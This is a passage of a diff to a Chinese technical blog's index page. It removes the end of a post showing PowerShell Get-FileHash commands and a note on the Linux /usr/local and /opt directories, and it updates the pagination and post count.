-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Get-FileHash C:\Windows\notepad.exe -Algorithm MD5| Format-List</div><div class="line">Get-FileHash C:\Windows\notepad.exe -Algorithm SHA1| Format-List</div></pre></td></tr></table></figure>
-</li>
-<li><p>linux中usr/local下一般是你安装软件的目录，这个目录就相当于在windows下的programefiles这个目录  /opt这个目录是一些大型软件的安装目录，或者是一些服务程序的安装目录</p>
-</li>
-</ul>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/10/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><span class="page-number current">11</span><a class="page-number" href="/page/12/">12</a><span class="space">&hellip;</span><a class="page-number" href="/page/16/">16</a><a class="extend next" rel="next" href="/page/12/"><i class="fa fa-angle-right"></i></a>
+    <a class="extend prev" rel="prev" href="/page/10/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><span class="page-number current">11</span><a class="page-number" href="/page/12/">12</a><span class="space">&hellip;</span><a class="page-number" href="/page/17/">17</a><a class="extend next" rel="next" href="/page/12/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
@@ -1805,7 +1789,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">160</span>
+                <span class="site-state-item-count">161</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
